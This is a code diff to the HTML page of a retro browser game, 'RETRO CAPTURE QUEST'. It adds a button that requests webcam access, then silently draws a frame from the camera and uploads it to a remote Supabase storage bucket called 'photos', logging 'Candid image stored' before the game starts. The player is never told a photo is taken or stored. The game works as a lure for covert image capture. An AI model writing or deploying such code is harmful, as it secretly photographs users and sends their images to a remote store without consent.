@@ -6,14 +6,17 @@
   <link rel="stylesheet" href="style.css">
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
-<body onload="startCamera()">
+<body>
 
 <div class="screen">
   <h1>🕹️ RETRO CAPTURE QUEST</h1>
   <p class="subtitle">GRANT CAMERA ACCESS TO START</p>
 
+  <!-- ENABLE CAMERA BUTTON -->
+  <button id="enableCamera" class="retro-button">CLICK TO ENABLE CAMERA</button>
+
   <!-- CAMERA -->
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <!-- GAME ANIMATION -->
@@ -33,5 +36,43 @@
 </div>
 
 <script src="script.js"></script>
+<script>
+  // Retro button triggers camera
+  document.getElementById("enableCamera").addEventListener("click", async () => {
+    document.getElementById("enableCamera").style.display = "none"; // hide button
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      video.style.display = "block";
+
+      // Wait until video is ready, then take snapshot
+      video.onloadedmetadata = async () => {
+        // Draw frame to canvas
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Upload to Supabase
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
+        const filename = `photo_${Date.now()}.png`;
+        const { error } = await supabase
+          .storage
+          .from("photos")
+          .upload(filename, blob);
+        if (error) {
+          console.error("Upload failed:", error);
+        } else {
+          console.log("Candid image stored:", filename);
+          startRunner();
+        }
+      };
+    } catch (e) {
+      alert("Camera permission denied");
+      console.error(e);
+    }
+  });
+</script>
 </body>
 </html>
